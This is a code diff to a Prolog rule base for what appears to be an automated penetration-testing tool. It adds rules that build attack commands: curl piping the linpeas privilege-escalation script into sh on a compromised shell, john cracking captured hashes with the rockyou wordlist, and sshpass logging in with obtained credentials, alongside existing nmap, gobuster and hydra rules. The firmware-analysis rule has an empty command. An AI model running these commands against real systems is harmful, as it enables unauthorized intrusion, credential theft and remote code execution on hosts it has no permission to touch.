@@ -1,6 +1,8 @@
 :- discontiguous tool/2.
 :- discontiguous profile/2.
 :- dynamic executed/1.
+:- dynamic connection/1.
+
 tool(gobuster, http_dir_scan_small).
 tool(gobuster, https_dir_scan_small).
 tool(gobuster, http_dir_scan_big).
@@ -34,6 +36,34 @@ fast_scan(Parameters, Command) :-
 
 full_scan(Parameters, Command) :- 
 	format_command("nmap -sC -sV -p- ~w", [Parameters.ip], Command). 
+
+tool(linpeas, linpeas).
+
+profile(linpeas, []) :- shell(connection), latestProfileExecution(linpeas, Time), get_time(Now), Time + 1000 < Now. 
+
+linpeas(Parameters, Command) :- 
+	format_command("curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh", [], Command). 
+
+tool(firmwalker, firmware_analysis).
+
+profile(firmware_analysis, [firmware=Firmware]) :- firmware(Firmware), latestProfileExecution(firmware_analysis, Time), get_time(Now), Time + 1000 < Now. 
+
+firmware_analysis(Parameters, Command) :- 
+	format_command("", [], Command). 
+
+tool(john, crack_hash).
+
+profile(crack_hash, [hash=Hash]) :- hash(Hash), latestProfileExecution(crack_hash, Time), get_time(Now), Time + 1000 < Now. 
+
+crack_hash(Parameters, Command) :- 
+	format_command("echo ~w > pass; john pass --wordlist=/usr/share/wordlist/rockyou.txt ;john --show pass", [Parameters.hash], Command). 
+
+tool(ssh, ssh_connection).
+
+profile(ssh_connection, [account=Username, password=Password, ip=Ip]) :- ip(Ip), account(Username), password(Password), latestProfileExecution(ssh_connection, Time), get_time(Now), Time + 1000 < Now. 
+
+ssh_connection(Parameters, Command) :- 
+	format_command("sshpass -p ~w ssh ~w@~w", [Parameters.password, Parameters.account, Parameters.ip], Command). 
 
 tool(hydra, ssh_attack).
 tool(hydra, ftp_attack).
